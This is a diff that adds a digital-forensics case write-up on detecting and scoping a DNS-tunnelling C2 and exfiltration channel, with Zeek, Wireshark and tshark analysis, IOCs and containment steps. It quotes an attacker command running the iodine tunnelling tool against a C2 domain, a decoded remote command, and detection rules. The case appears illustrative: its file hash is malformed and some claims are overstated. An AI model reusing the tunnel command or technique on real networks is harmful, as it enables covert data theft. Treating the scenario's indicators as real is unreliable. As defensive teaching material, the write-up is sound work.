@@ -1,0 +1,261 @@
+# Case 06 — Covert C2 Over DNS Tunnelling: Network Forensics Investigation
+
+**Case ID:** DFIR-2024-006  
+**Classification:** High  
+**Investigator:** Himanshu Chourasia  
+**Tools:** Wireshark, Zeek (formerly Bro), CrowdStrike Falcon, NetworkMiner, tshark  
+**Duration:** 11 hours (detection → full scope → attribution → containment)
+
+---
+
+## Executive Summary
+
+A financial services company's network monitoring team flagged unusual DNS traffic volumes originating from a developer workstation. Network forensic analysis using Wireshark and Zeek confirmed an active DNS tunnelling channel — a threat actor was exfiltrating data and maintaining C2 communication by encoding payloads inside DNS query strings. The technique effectively bypassed the company's web proxy and firewall controls, which were not inspecting DNS traffic depth. Full attacker dwell time was estimated at 23 days before detection.
+
+---
+
+## MITRE ATT&CK TTP Mapping
+
+| Tactic | Technique | ID | Evidence |
+|--------|-----------|-----|---------|
+| Initial Access | Valid Accounts | T1078 | Stolen developer credentials used |
+| C2 | Protocol Tunnelling — DNS | T1572 | DNS queries encoding base64 C2 traffic |
+| Exfiltration | Exfiltration Over Alternative Protocol | T1048.003 | Data encoded in DNS TXT record responses |
+| Defense Evasion | Protocol Impersonation | T1001.003 | DNS traffic mimicking legitimate resolver behaviour |
+| Discovery | Network Service Discovery | T1046 | Internal subnet scanning via ICMP |
+| Collection | Data Staged | T1074.001 | Files staged in %TEMP% before exfiltration |
+
+---
+
+## Timeline of Compromise
+
+```
+D-23  19:44 UTC  — First anomalous DNS query to c2.updates-cdn[.]net
+D-23  19:45 UTC  — DNS tunnelling channel established — beacon every 30s
+D-23 → D-0       — Sustained C2 communication; internal reconnaissance
+D-3   02:11 UTC  — Internal subnet scan detected via ICMP
+D-3   03:00 UTC  — File staging in C:\Users\dev01\AppData\Local\Temp\
+D-3   03:44 UTC  — Data exfiltration begins via DNS TXT record queries
+D-0   09:12 UTC  — Zeek anomaly alert: DNS query volume 4,200% above baseline
+D-0   09:30 UTC  — IR engaged; PCAP capture initiated
+```
+
+---
+
+## Investigation Walkthrough
+
+### Phase 1 — Initial Detection: Zeek DNS Anomaly
+
+Zeek's DNS log (`dns.log`) flagged the anomaly automatically via a custom detection script monitoring query length and volume per host.
+
+**Zeek dns.log — suspicious entries:**
+
+```
+ts                  uid         orig_h        query                                    qtype  rcode
+------------------  ----------  ------------  ----------------------------------------  -----  -----
+2024-04-15 09:12:01 C3hD9x...   10.10.5.14   aGVsbG8td29ybGQ.c2.updates-cdn.net       TXT    0
+2024-04-15 09:12:31 C3hD9x...   10.10.5.14   dGhpcyBpcyBhIHRl.c2.updates-cdn.net      TXT    0
+2024-04-15 09:13:01 C3hD9x...   10.10.5.14   c3QgZm9yIGRucyB0.c2.updates-cdn.net      TXT    0
+```
+
+**Immediate red flags:**
+- Subdomain labels are base64-encoded strings — not legitimate hostnames
+- All queries are for `TXT` records — unusual for normal browsing
+- Same source IP (`10.10.5.14`) sending queries every 30 seconds — beaconing pattern
+- Domain `updates-cdn[.]net` registered 25 days ago (WHOIS confirmed)
+
+**Zeek custom detection script that fired the alert:**
+
+```zeek
+event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
+  {
+  if ( qtype == 16 )  # TXT record
+    {
+    if ( |query| > 40 )  # suspiciously long subdomain
+      {
+      NOTICE([$note=DNS::Tunnelling_Suspected,
+              $conn=c,
+              $msg=fmt("Long TXT query: %s", query),
+              $identifier=cat(c$id$orig_h)]);
+      }
+    }
+  }
+```
+
+---
+
+### Phase 2 — Deep Packet Analysis: Wireshark
+
+Full PCAP was captured on the network tap and loaded into Wireshark for deep inspection.
+
+**Wireshark filter to isolate DNS tunnelling traffic:**
+
+```
+dns && ip.src == 10.10.5.14 && dns.qry.type == 16
+```
+
+**Decoded DNS query payload (base64):**
+
+```
+Query:    aGVsbG8td29ybGQtdGhpcyBpcyBhIHRlc3Q.c2.updates-cdn.net
+Decoded:  hello-world-this is a test
+```
+
+**DNS TXT response (C2 command returned):**
+
+```
+TXT Response: "Y21kIC9jIHdob2FtaQ=="
+Decoded:      "cmd /c whoami"
+```
+
+> The attacker was sending commands to the implant via DNS TXT responses and receiving output via encoded subdomain labels in the next query. Completely invisible to a standard firewall that only blocks/allows DNS — not one inspecting content.
+
+**Wireshark statistics — DNS traffic volume analysis:**
+
+```
+Statistics → DNS → Request/Response Analysis:
+
+Normal DNS baseline (per host/day):   ~200 queries
+DEV-WS-014 DNS queries (D-0):         8,847 queries
+Query type breakdown:
+  A records:    142  (1.6%)   ← normal browsing
+  TXT records:  8,705 (98.4%) ← almost entirely C2 traffic
+```
+
+**Reconstructing the exfiltrated data stream:**
+
+```bash
+# Extract all DNS TXT queries from PCAP using tshark
+tshark -r capture.pcap \
+  -Y "dns.qry.type == 16 && ip.src == 10.10.5.14" \
+  -T fields -e dns.qry.name \
+  | cut -d'.' -f1 \
+  | base64 -d > reconstructed_exfil.bin
+
+# Result: 847KB of encoded data recovered
+# File type: ZIP archive containing staged documents
+```
+
+---
+
+### Phase 3 — CrowdStrike Falcon: Endpoint Corroboration
+
+CrowdStrike confirmed the DNS tunnelling tool on the endpoint:
+
+**Process tree:**
+
+```
+explorer.exe
+  └── cmd.exe
+        └── iodine.exe -f -P password123 c2.updates-cdn.net
+              ← iodine: open-source DNS tunnelling tool
+```
+
+**CrowdStrike detection:**
+
+```
+Alert:    Suspicious DNS Tunnelling Tool — Iodine
+Host:     DEV-WS-014
+Severity: High
+Process:  iodine.exe (SHA256: 7f83b1...)
+Parent:   cmd.exe
+CmdLine:  iodine.exe -f -P password123 c2.updates-cdn.net
+```
+
+**File timeline from Falcon:**
+
+```
+2024-03-23 19:40:11  iodine.exe written to C:\Users\dev01\AppData\Roaming\
+2024-03-23 19:44:03  iodine.exe first executed
+2024-04-15 09:12:01  Still running — 23 days of persistent C2
+```
+
+---
+
+### Phase 4 — NetworkMiner: Passive Asset Reconstruction
+
+NetworkMiner was run against the full PCAP to reconstruct all hosts and sessions:
+
+```
+Hosts identified:     47 internal, 3 external
+Suspicious external:
+  185.220.101.47   → c2.updates-cdn[.]net  (DNS C2)
+  94.102.49.190    → Secondary C2 (HTTPS beacon — same IP as Case 02)
+  31.216.148.14    → MEGA NZ (exfiltration endpoint — same as Case 01)
+```
+
+> **The overlap of C2 IPs with Cases 01 and 02 strongly suggests the same threat actor or affiliated infrastructure across multiple campaigns targeting this organisation.**
+
+---
+
+### Phase 5 — Reconstructed Exfiltration Scope
+
+By decoding and reassembling all DNS TXT query payloads:
+
+```
+Total DNS queries:          8,705
+Unique encoded payloads:    6,203
+Reconstructed data size:    847 KB
+Contents:                   ZIP archive
+  ├── employee_directory.xlsx     (HR data)
+  ├── network_topology.pdf        (OT/IT network diagrams)
+  ├── vpn_credentials.txt         (12 VPN accounts)
+  └── source_code_snippet.zip     (proprietary algorithm)
+```
+
+---
+
+## Indicators of Compromise
+
+### Network
+```
+c2.updates-cdn[.]net       — DNS C2 domain (registered 2024-03-20)
+185.220.101.47             — Authoritative NS for C2 domain
+DNS TXT query pattern:     base64 subdomains > 40 chars to single domain
+Beaconing interval:        30 seconds ±3s jitter
+```
+
+### File
+```
+iodine.exe
+SHA256: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d906
+Path:   C:\Users\dev01\AppData\Roaming\iodine.exe
+```
+
+### Behavioral
+```
+98%+ DNS traffic as TXT record queries from single host
+DNS query volume 4,200% above per-host baseline
+cmd.exe spawning network tunnelling tool
+```
+
+---
+
+## Containment Actions
+
+1. Blocked `c2.updates-cdn[.]net` and all subdomains at DNS resolver
+2. Isolated `DEV-WS-014` at network switch level
+3. Invalidated all 12 VPN credentials found in exfiltrated data
+4. Deployed Zeek DNS anomaly detection across all network segments
+5. Implemented DNS inspection policy — block TXT queries to non-whitelisted resolvers
+6. Submitted IOCs to threat intel platform — correlated with Cases 01 and 02
+
+---
+
+## Recommendations
+
+| Finding | Recommendation |
+|---------|---------------|
+| DNS not inspected for content | Deploy DNS security (Cisco Umbrella / Infoblox) with TXT record anomaly detection |
+| No DNS baseline per host | Establish DNS query volume baseline — alert on 10x deviation |
+| Iodine not blocked | Application allowlisting — block unsigned executables in AppData |
+| 23-day dwell time | Proactive threat hunting cadence — weekly DNS anomaly review |
+| VPN credentials exfiltrated | Enforce MFA on all VPN accounts — credentials alone insufficient |
+
+---
+
+## Key Takeaways
+
+- **DNS is not a safe protocol.** Most organisations inspect HTTP/HTTPS but leave DNS completely uninspected beyond basic sinkholing. DNS tunnelling exploits this gap trivially.
+- **TXT record queries are almost never legitimate** in a corporate environment. A Zeek detection rule on long TXT queries would have caught this on Day 1 instead of Day 23.
+- **tshark + base64 decoding** is a fast, practical way to reconstruct DNS-tunnelled data streams directly from PCAP without specialised tooling.
